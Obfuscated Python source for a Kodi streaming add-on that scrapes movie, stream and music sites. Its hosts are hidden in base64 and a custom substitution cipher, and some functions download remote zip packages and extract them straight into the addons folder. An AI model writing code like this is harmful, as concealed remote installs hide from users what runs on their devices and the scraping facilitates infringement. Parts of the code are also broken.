  if 81 - 81: iI1Ii11iII1 / iI1Ii11iII1 / Ooo00oOo00o % Ooo0OO0oOO . iIii1I11I1II1
  if 85 - 85: oO0O
def Oo0O0OooOooo0 ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div id="play-1".+?src="(.+?)" scrolling="no".+?<li><a href="#play-1">(.+?)</a></li>' , re . DOTALL ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , ( url + '&fv=&sou=' ) . replace ( 'player' , 'watch' ) , 7000 , ii11iIi1I + 'icon.png' )
  if 81 - 81: Ooo0OO0oOO - i11i1
def IIIIii11II1I ( name , url , img ) :
 oO0 = i11iIIIIIi1 ( url )
 iIiiIIii1 = re . compile ( '<iframe class="playerframe" src="(.+?)" scrolling=".+?" marginwidth=".+?" marginheight=".+?" vspace=".+?" hspace=".+?" allowfullscreen=".+?" webkitallowfullscreen=".+?" mozallowfullscreen=".+?" width=".+?" height=".+?" frameborder=".+?"></iframe>' , re . DOTALL ) . findall ( oO0 )
 iIii = len ( iIiiIIii1 )
 if 95 - 95: OOoo0OO0 / iI1Ii11iII1 . O0 * iI1Ii11iII1 - OOooOOo * Oo
 if 6 - 6: I1IiI . OoOoOO00 * OOOo0 . OOOo0 / oO0O
 if iIii == 1 :
  for I1I1ii1111 in iIiiIIii1 :
   I1I1ii1111 = I1I1ii1111 . replace ( 'player' , 'watch' )
   IIIiI1iiiIIIi = I1I1ii1111 + '&fv=&sou='
   OoO000Oo00 = i11iIIIIIi1 ( IIIiI1iiiIIIi )
   iI1oOoo = re . compile ( '<source src="(.+?)" type=".+?">' , re . DOTALL ) . findall ( OoO000Oo00 )
   for i1oOOO0ooOO in iI1oOoo :
    o00O0o00oo = False
    Resolve ( i1oOOO0ooOO )
    if 19 - 19: OOOo0
 elif iIii > 1 :
  if 66 - 66: Ooo0OO0oOO / I1IiI
  for I1I1ii1111 in iIiiIIii1 :
   iII1I = i11iIIIIIi1 ( I1I1ii1111 )
   o00oOOo0Oo = re . compile ( '<iframe width=".*?" height=".*?" frameborder=".*?" src="(.*?)" scrolling=".*?" marginwidth=".*?" marginheight=".*?" vspace=".*?" hspace=".*?" allowfullscreen=".*?" webkitallowfullscreen=".*?" mozallowfullscreen=".*?"></iframe>' , re . DOTALL ) . findall ( iII1I )
   Oooo0o0oO = o00oOOo0Oo
   Oooo0o0oO = ( str ( Oooo0o0oO ) ) . replace ( '[\'' , '' ) . replace ( '\']' , '' ) ;
   print 'Stripped url : ' + Oooo0o0oO
   IIi1I ( 'DOUBLE LINK' , Oooo0o0oO , 424 , '' )
   if 82 - 82: oOO
   for url in o00oOOo0Oo :
    I1111I1II11 ( 'DOUBLE LINK' , url , 424 , '' )
    try :
     I1III1111iIi = Google . resolve ( url )
    except :
     pass
    try :
     OoOooO0 = re . findall ( r"{'url': u'(.*?)', 'quality': 'HD'}, {'url': u'(.*?)', 'quality': 'SD'}" , str ( I1III1111iIi ) )
     for iI1IiiiIi , IiI111 in OoOooO0 :
      if 82 - 82: OOOo0 % Ooo00oOo00o % OOoo0OO0 + OOoo0OO0
      HD_URLS . append ( iI1IiiiIi )
      SD_URLS . append ( IiI111 )
    except :
     pass
 else :
  pass
  if 6 - 6: Oo
def O0OOOOoO00oo ( ) :
 if 80 - 80: i1IIi . OOOo0 - Ooo0OO0oOO + i11i1 + II1i1IiiIIi11 % Ooo0OO0oOO
 if 13 - 13: OoOoOO00 / I1IiI / I1IiI + oOO
 I1111I1II11 ( 'Genres' , 'http://cnfstudio.com/movies/' , 7002 , ii11iIi1I + 'Movies.png' )
 if 49 - 49: O0 / OoOoOO00 * OOOo0 - OoooooooOO . OoOoOO00 % iI1Ii11iII1
 I1111I1II11 ( 'Search Movies' , '' , 7017 , ii11iIi1I + 'Movies.png' )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 13 - 13: Ooo0OO0oOO . iIii1I11I1II1 . i11i1 . iI1Ii11iII1
 if 58 - 58: OOoo0OO0
def Ii11I ( ) :
 IIIII1II = i11iIIIIIi1 ( 'http://cnfstudio.com/' )
 OoOO0oo0o = re . compile ( '<a href="http://cnfstudio.com/genre/(.+?)">(.+?)</a>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , 'http://cnfstudio.com/genre/' + I1i11i , 7003 , ii11iIi1I + 'icon.png' )
  if 72 - 72: O0 + OOooOOo + OOOo0 / Oo
i1iiIIiiI111 = xbmcgui . Dialog ( )
if 83 - 83: iI1Ii11iII1 - OOOo0 . oO0O
iI1Iii11i = '{UN},' ; O0OOOo0o = '{IG},' ; ooo0oOOOO00Oo = '{PL},' ; Ii1iii1 = '{LO},' ; iii11III1I = '{LP},' ; oO0oO0O = '{HA},' ; ooooO = '{XD},' ; O000oooO0 = '{TA},' ; oOO00 = '{DP},' ; oO0o00 = '{JT},' ; Oo0OOOO0oOoo0 = '{JJ},' ; O0OIIII1i = '{MM},' ; i1I1Iiii = '{FQ},' ; I1iIIIiiii = '{HH},'
if 44 - 44: I1I1ii / oO0O * i11i1 * i1IIi . oO0O * i11iIiiIii
def O0o0oo0O ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div class="movie">.+?<img src="(.+?)" alt=".+?" />.+?<a href="(.+?)"><span class="player"></span></a>.+?<h2>(.+?)</h2>' , re . DOTALL ) . findall ( IIIII1II )
 Ooo00OOo000 = re . compile ( "<link rel='next' href='(.+?)'/>" ) . findall ( IIIII1II )
 for IIIIiI11I11 , url , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( ( OO0ooOOO0OOO ) . replace ( '&#038;' , '' ) . replace ( '&#8216;' , '' ) . replace ( '&#8217;' , '' ) . replace ( '&#8211;' , '' ) , url , 7004 , IIIIiI11I11 )
 Ooo00OOo000 = Ooo00OOo000
 for url in Ooo00OOo000 :
  I1111I1II11 ( 'Next Page' , url , 7003 , ii11iIi1I + 'Next.png' )
  if 12 - 12: oO0O . OOOo0 % OOooOOo
def I11i1I11 ( url ) :
 if 32 - 32: iI1Ii11iII1 - Ooo0OO0oOO . iIii1I11I1II1 . I1I1ii + OoOoOO00 % OoooooooOO
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div id="play-1" class="player-content"><iframe class="playerframe" src="(.+?)" scrolling="no".+?</div>' , re . DOTALL ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  oo0OoOOO0o0 = url + '&fv=&sou='
  oo0OoOOO0o0 = oo0OoOOO0o0 . replace ( 'player' , 'watch' )
  Oo000 = oOiiIIIII ( oo0OoOOO0o0 )
  iiI1 = oOiiIIIII ( url )
  if 40 - 40: O0 + iI1Ii11iII1 . oO0O
  if 29 - 29: i11i1 / I1IiI . iIii1I11I1II1 / OOoo0OO0 % I1IiI % II1i1IiiIIi11
def oOiiIIIII ( url ) :
 if 49 - 49: OoOoOO00 / iI1Ii11iII1 - oO0O
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<video id=".+?<source src="(.+?)" type="video/mp4">' , re . DOTALL ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  I1i111I ( url )
  if 7 - 7: OOOo0 / Ooo00oOo00o + I1I1ii + OOoo0OO0 / OOOo0
  if 82 - 82: ii11ii1ii + OoooooooOO
def IIiIi11i111II ( ) :
 O00OOOoOoo0O ( '[COLORgreen]Local M3u[/COLOR]' , oOo0oooo00o , 2001 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Remote M3u[/COLOR]' , Oo0o0000o0o0 , 1009 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 if 52 - 52: OoooooooOO / iI1Ii11iII1 - i1IIi
def Oo00o ( url ) :
 OoOO0oo0o = re . compile ( '^#EXTINF:-?[0-9]*(.*?),(.*?)\n(.*?)$' , re . I + re . M + re . U + re . S ) . findall
 for IIIi1ii , OO0ooOOO0OOO , url in OoOO0oo0o :
  IIi1I ( OO0ooOOO0OOO , url , 222 , ii11iIi1I + 'streams.png' )
  if 13 - 13: iIii1I11I1II1 - OoOoOO00 % O0 . oO0O % Ooo00oOo00o
  if 2 - 2: OoooooooOO - oO0O % Ooo0OO0oOO / OOOo0 / OOooOOo
def oO0OOoo0OO ( ) :
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cHM6Ly9naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvdHJlZS9tYXN0ZXIvX3JlcG8vcGx1Z2luLnZpZGVvLkdlbmllVHY=' ) )
 OoOO0oo0o = re . compile ( '<span class="css-truncate css-truncate-target"><a href="/GenieTv/Genie_Tv/blob/master/_repo/plugin.video.GenieTv/(.+?)" class="js-navigation-open" id=".+?" title=".+?">.+?</a></span>' ) . findall ( oO0 )
 for I1i11i in OoOO0oo0o :
  I1i11i = i1111 ( 'aHR0cDovL3Jhdy5naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvbWFzdGVyL19yZXBvL3BsdWdpbi52aWRlby5HZW5pZVR2Lw==' ) + I1i11i
 OO0ooOOO0OOO = 'plugin.video.GenieTv'
 if 3 - 3: OoOoOO00 / i11i1
 i1I ( I1i11i , OO0ooOOO0OOO )
 if 49 - 49: i1IIi - I1IiI . Oo + iIii1I11I1II1 - oOO / Oo
def III1iII1I1ii ( ) :
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cHM6Ly9naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvdHJlZS9tYXN0ZXIvX3JlcG8vcmVwb3NpdG9yeS5HZW5pZVR2' ) )
 OoOO0oo0o = re . compile ( '<span class="css-truncate css-truncate-target"><a href="/GenieTv/Genie_Tv/blob/master/_repo/repository.GenieTv/(.+?)" class="js-navigation-open" id=".+?" title=".+?">.+?</a></span>' ) . findall ( oO0 )
 for I1i11i in OoOO0oo0o :
  I1i11i = i1111 ( 'aHR0cDovL3Jhdy5naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvbWFzdGVyL19yZXBvL3JlcG9zaXRvcnkuR2VuaWVUdi8=' ) + I1i11i
 OO0ooOOO0OOO = 'repository.GenieTv'
 if 24 - 24: Ooo0OO0oOO - II1i1IiiIIi11 / oOO
 i1I ( I1i11i , OO0ooOOO0OOO )
 if 10 - 10: I1IiI * i1IIi
 if 15 - 15: OOoo0OO0 + i1IIi - OoOoOO00 % OOOo0
def iIIi1 ( ) :
 O00OOOoOoo0O ( '[COLORgreen]CATAGORIES[/COLOR]' , '' , 10051 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]SEARCH[/COLOR]' , '' , 10052 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 if 76 - 76: OOOo0 - OOOo0 - OOooOOo % oOO * O0
 if 11 - 11: oO0O + OOoo0OO0 . Ooo00oOo00o . i11iIiiIii * Ooo00oOo00o
o0oO0 = xbmcaddon . Addon ( id = 'plugin.video.GenieTv' )
oOOoo00O0O = xbmcgui . Dialog ( )
oooOOOOO = xbmc . translatePath ( 'special://home/' )
Oo0oO0ooo = xbmcgui . DialogProgress ( )
I1IIiIi = 'https://addons.tvaddons.ag/'
if 93 - 93: Ooo0OO0oOO - i11i1 + OOooOOo . Ooo0OO0oOO / OOoo0OO0
def o0000oO ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 IiiI1II1II1i = 'https://addons.tvaddons.ag/search/?keyword=' + IIo0Oo0oO0oOO00
 oO0 = i11iIIIIIi1 ( IiiI1II1II1i )
 OoOO0oo0o = re . compile ( '<li><a href="(.+?)"><span class=".+?"><img src="(.+?)" width=".+?" alt=".+?" class=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( oO0 )
 for I1i11i , IIii11Ii1i1I , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , I1i11i , 10054 , 'https://addons.tvaddons.ag/' + IIii11Ii1i1I , i1iiIII111ii , '' )
  if 83 - 83: Ooo00oOo00o
  if 16 - 16: oOO
def iIiiIiIIiI ( ) :
 oO0 = i11iIIIIIi1 ( I1IIiIi )
 OoOO0oo0o = re . compile ( '<li><a href="(.+?)"><span class="thumbnail"><img src="(.+?)" class="pic" alt=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( oO0 )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Repositories' in OO0ooOOO0OOO :
   pass
  elif 'Services' in OO0ooOOO0OOO :
   pass
  elif 'International' in OO0ooOOO0OOO :
   pass
  else :
   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 10053 , 'https://addons.tvaddons.ag/' + IIIIiI11I11 , i1iiIII111ii , '' )
   if 93 - 93: iI1Ii11iII1 % ii11ii1ii
   if 31 - 31: OoOoOO00 + i11i1 - OoooooooOO . OOoo0OO0
def Addon ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 i1IoOo000Oo00o = re . compile ( '<li class="nextPage"><a class=".+?" href="(.+?)"><dfn title="next Page">.+?</dfn></a></li>' ) . findall ( oO0 )
 for url in i1IoOo000Oo00o :
  O00OOOoOoo0O ( '[COLORgreen]NEXT PAGE[/COLOR]' , 'https://addons.tvaddons.ag' + url , 10053 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 OoOO0oo0o = re . compile ( '<li><a href="(.+?)"><span class=".+?"><img src="(.+?)" width=".+?" alt=".+?" class=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( oO0 )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Please' in OO0ooOOO0OOO :
   pass
  else :
   O00OOOoOoo0O ( OO0ooOOO0OOO , url , 10054 , 'https://addons.tvaddons.ag/' + IIIIiI11I11 , i1iiIII111ii , '' )
   if 81 - 81: OoooooooOO
   if 88 - 88: O0 * OOooOOo
def IIiII ( url , name ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)"' ) . findall ( oO0 )
 for url in OoOO0oo0o :
  if 'plugin' in url :
   print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<' + url
   Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
   Oo0oO0ooo = xbmcgui . DialogProgress ( )
   Oo0oO0ooo . create ( "Origin+Jaybox" , "Downloading Content" , '' , 'Please Wait' )
   I1iiii = os . path . join ( Oo0OO0000oooo , name + '.zip' )
   try :
    os . remove ( I1iiii )
   except :
    pass
   downloader . download ( url , I1iiii , Oo0oO0ooo )
   OOOOO = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
   time . sleep ( 2 )
   Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
   print '======================================='
   print OOOOO
   print '======================================='
   extract . all ( I1iiii , OOOOO , Oo0oO0ooo )
   o0Oo00 ( )
   if 39 - 39: OOooOOo / iI1Ii11iII1 - II1i1IiiIIi11
def i1I ( url , name ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Origin+Jaybox" , "Downloading Content" , '' , 'Please Wait' )
 I1iiii = os . path . join ( Oo0OO0000oooo , name + '.zip' )
 try :
  os . remove ( I1iiii )
 except :
  pass
 downloader . download ( url , I1iiii , Oo0oO0ooo )
 OOOOO = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print OOOOO
 print '======================================='
 extract . all ( I1iiii , OOOOO , Oo0oO0ooo )
 o0Oo00 ( )
 if 96 - 96: OOoo0OO0 * ii11ii1ii * oO0O + ii11ii1ii % OOOo0 + i11iIiiIii
def o0Oo00 ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "Origin + Genie TV" , '' , '                                 REFRESH SUCCESSFUL :)' , "                          [COLOR gold]Brought To You By Origin + Jaybox[/COLOR]" )
 return
 if 37 - 37: OOoo0OO0 % ii11ii1ii / oOO
 if 94 - 94: OOoo0OO0 / Ooo00oOo00o . OOooOOo
def iIi ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvc2NyYXBlZC9jYXRzLnBocA==' ) )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
 for I1i11i , IIii11Ii1i1I , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , I1i11i , 1007 , IIii11Ii1i1I )
def OoiiI11111II ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
 for url , IIii11Ii1i1I , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 1006 , IIii11Ii1i1I )
  if 48 - 48: II1i1IiiIIi11 % i11iIiiIii . OoooooooOO * iI1Ii11iII1 % Ooo00oOo00o . II1i1IiiIIi11
  if 6 - 6: O0 . oOO - Ooo0OO0oOO / i11iIiiIii
def O00O0 ( url , iconimage , name ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
 for url , iconimage , oOoO00o , iI1ii1i , name in OoOO0oo0o :
  if 'http' in url :
   if '.php' in url :
    O0Oo00OO00Ooo ( name , url , 1016 , iconimage , iI1ii1i , oOoO00o )
   else :
    if 'youtube' in url :
     oOOOOi11i11 ( name , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iconimage , iI1ii1i , oOoO00o )
    else :
     oOOOOi11i11 ( name , url , 222 , iconimage , iI1ii1i , oOoO00o )
     Oo0oO ( 'movies' , 'INFO' )
  else :
   O00o0O ( url , iconimage , name )
   if 73 - 73: Ooo00oOo00o
 else :
  OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
  for url , IIii11Ii1i1I , name in OoOO0oo0o :
   if 'http' in url :
    if '.php' in url :
     I1111I1II11 ( name , url , 1016 , IIii11Ii1i1I )
    else :
     if 'youtube' in url :
      print '>>>>>>>>>>>>>>>>>>>>>>> youtube old way'
      IIi1I ( name , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii11Ii1i1I )
     else :
      IIi1I ( name , url , 222 , IIii11Ii1i1I )
      Oo0oO ( 'movies' , 'INFO' )
   else :
    O00o0O ( url , IIii11Ii1i1I , name )
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 28 - 28: OoooooooOO - OOoo0OO0
def O00o0O ( url , iconimage , name ) :
 iconimage = iconimage
 name = name
 url = url
 oOOO0 = ( url ) . replace ( oOo0OoOOOo0 , 'http' ) . replace ( ooooooo00oO0OO , '.com' ) ;
 oo0 = ( oOOO0 ) . replace ( OOoo00 , 'a' ) . replace ( iiiO0ooO0O0Ooo0o , 'b' ) . replace ( IIi11IIiIi1i , 'c' ) . replace ( oOOO00oOO , 'd' ) . replace ( ooo0oOOOO00Oo , 'e' ) . replace ( oO0o00 , 'f' ) ;
 I11iIi1i1I1i1 = ( oo0 ) . replace ( Ii11IIIi1 , 'g' ) . replace ( oO0oO0O , 'h' ) . replace ( IIIii11 , 'i' ) . replace ( OOOOOoooO , 'j' ) . replace ( Iii , 'k' ) . replace ( Ooo0o0ooooOOo , 'l' ) ;
 iiiiii1ii1 = ( I11iIi1i1I1i1 ) . replace ( iIIII1i1 , 'm' ) . replace ( I1I1 , 'n' ) . replace ( oO00o0oOoo , 'o' ) . replace ( oOOI1 , 'p' ) . replace ( OOI1i , 'q' ) . replace ( i1II1iII1 , 'r' ) ;
 I11II11IiI11 = ( iiiiii1ii1 ) . replace ( O00oIi11Iiii1iiii , 's' ) . replace ( iiIIiIi , 't' ) . replace ( i1IIII1111 , 'u' ) . replace ( Ooo0o0000OO , 'v' ) . replace ( iIiI1II1I1 , 'w' ) . replace ( OooiIiI1i1Ii , 'x' ) ;
 Oo0o00o = ( I11II11IiI11 ) . replace ( III1I1 , 'y' ) . replace ( iI1IIIIII , 'z' ) . replace ( iI1Iii11i , '.' ) . replace ( O0OOOo0o , '(' ) . replace ( Ii1iii1 , ')' ) . replace ( iii11III1I , '/' ) ;
 OO0oO0Oo = ( Oo0o00o ) . replace ( iii1 , '1' ) . replace ( O000oO , '2' ) . replace ( OoooOO0 , '3' ) . replace ( O000oooO0 , '4' ) . replace ( oOO00 , '5' ) . replace ( i1i11I1I1 , '6' ) ;
 oo0OoO = ( OO0oO0Oo ) . replace ( Oo0OOOO0oOoo0 , '7' ) . replace ( O0OIIII1i , '8' ) . replace ( i1I1Iiii , '9' ) . replace ( I1iIIIiiii , '0' ) . replace ( OOoO0o , ':' ) . replace ( O00Oo , '%' ) ;
 url = ( oo0OoO ) . replace ( oO000 , '-' ) . replace ( ooooO , '_' ) ;
 IIi1I ( name , url , 222 , iconimage ) ;
 if 2 - 2: ii11ii1ii - Oo
 if 4 - 4: O0 / OOoo0OO0 . Ooo00oOo00o - oOO / i11i1
def I1IIiIi1I1I1 ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdm9kL3VybHMvdXJsLnBocA==' ) )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
 for I1i11i , IIii11Ii1i1I , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , I1i11i , 1007 , IIii11Ii1i1I )
def IIi1iI11Ii ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
 for url , IIii11Ii1i1I , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 1006 , IIii11Ii1i1I )
  if 20 - 20: OOooOOo / iI1Ii11iII1
def II1I11 ( name , url , iconimage = None ) :
 print '--- Playing "{0}". {1}' . format ( name , url )
 I11iIiIii = xbmcgui . ListItem ( path = url , thumbnailImage = iconimage )
 I11iIiIii . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , I11iIiIii )
 if 60 - 60: i1IIi / OOOo0 . OoOoOO00 . II1i1IiiIIi11 % Ooo0OO0oOO - OOOo0
 if 39 - 39: OOOo0 . Ooo00oOo00o + OOoo0OO0 + i11i1 / OoOoOO00 % i11iIiiIii
def OOOo0Ooo0 ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 1006 , IIIIiI11I11 )
def III1 ( url ) :
 IIIII1II = iI1 ( url )
 IiI1ii11I1 = url
 OoOO0oo0o = re . compile ( "<a href='(.+?)'>(.+?)</a>" ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  if '.mp3' in OO0ooOOO0OOO :
   print '<<<<<<<<<<<<<<<<<<<' + url + '>>>>>>>>>>>>>>>>>>>>>>>>>>>'
   IIi1I ( ( OO0ooOOO0OOO ) . replace ( '.mp3' , '' ) . replace ( '/' , '' ) , 'http://hypem.com' + url , 222 , ii11iIi1I + 'music.png' )
  else :
   I1111I1II11 ( ( OO0ooOOO0OOO ) . replace ( '/' , '' ) , IiI1ii11I1 + url , 1011 , ii11iIi1I + 'music.png' )
def IIi1iI1i ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL3d3dy5jeW4ubmV0L211c2ljLw==' ) )
 OoOO0oo0o = re . compile ( '<td><a href="(.+?)"><img src="(.+?)"><br>(.+?)</a></td>' , re . DOTALL ) . findall ( IIIII1II )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , ( 'http://www.cyn.net/music/' + I1i11i ) . replace ( ' ' , '%20' ) , 1031 , ( 'http://www.cyn.net/music/' + IIIIiI11I11 ) . replace ( ' ' , '%20' ) )
def Iii11II1 ( url , img ) :
 IIIII1II = iI1 ( url )
 I1III1111iIi = url
 img = img
 OoOO0oo0o = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( ( OO0ooOOO0OOO ) . replace ( '.mp3' , '' ) , ( I1III1111iIi + '/' + url ) . replace ( ' ' , '%20' ) , 222 , img )
  if 42 - 42: Oo / iI1Ii11iII1 . oO0O * OOOo0
  if 54 - 54: I1IiI * II1i1IiiIIi11 + Ooo00oOo00o
def oOOOo ( ) :
 O0o = ( i1111 ( 'aHR0cDovL2h5cGVtLmNvbS9kb3dubG9hZC8=' ) )
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 I1i11i = ( i1111 ( 'aHR0cDovL3Bhbmljc3RyZWFtLm5ldC9zdHJlYW1zLw==' ) )
 I1III1111iIi = ( i1111 ( 'aHR0cDovL21hc2xvdmQubm8taXAub3JnL3B1YmxpYy9tcDMv' ) )
 OooOo0oo0O0o00O = ( i1111 ( 'aHR0cDovL3d3dy5jeW4ubmV0L211c2ljLw==' ) )
 if 91 - 91: oOO - Ooo0OO0oOO + Ooo0OO0oOO
 oO0 = iiIiII ( I1i11i )
 Iiii1iI1i = iiIiII ( I1III1111iIi )
 ooO000OO = iiIiII ( OooOo0oo0O0o00O )
 if 14 - 14: ii11ii1ii * I1I1ii % i1IIi / ii11ii1ii
 if oO0 != 'Failed' :
  OoOO0oo0o = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( oO0 )
  for OO0ooOOO0OOO in OoOO0oo0o :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( OO0ooOOO0OOO + ' source 1' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( I1i11i + OO0ooOOO0OOO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    if 48 - 48: Oo
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if Iiii1iI1i != 'Failed' :
  II11i1I11Ii1i = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( oO0 )
  for OO0ooOOO0OOO in II11i1I11Ii1i :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( OO0ooOOO0OOO + ' source 2' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( I1III1111iIi + OO0ooOOO0OOO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    if 75 - 75: ii11ii1ii - iI1Ii11iII1 * Oo . OoooooooOO * I1I1ii * OOOo0
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if ooO000OO != 'Failed' :
  I1I1Iiii1 = re . compile ( '<td><a href=".+?"><img src=".+?"><br>(.+?)</a></td>' , re . DOTALL ) . findall ( ooO000OO )
  for OO0ooOOO0OOO in I1I1Iiii1 :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( OO0ooOOO0OOO + ' source 3' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( OooOo0oo0O0o00O + OO0ooOOO0OOO ) . replace ( ' ' , '%20' ) , 1031 , '' )
    if 30 - 30: I1IiI / Ooo0OO0oOO / oO0O * OOooOOo * Ooo0OO0oOO . OOOo0
    Oo0oO ( 'tvshows' , 'Media Info 3' )
    if 93 - 93: I1IiI
    if 97 - 97: i11iIiiIii
    if 68 - 68: iI1Ii11iII1 * Ooo00oOo00o . OOoo0OO0 / oO0O . OOooOOo - i11iIiiIii
    if 49 - 49: Oo / oO0O % OOoo0OO0 + Ooo0OO0oOO - Ooo00oOo00o
    if 13 - 13: OoOoOO00
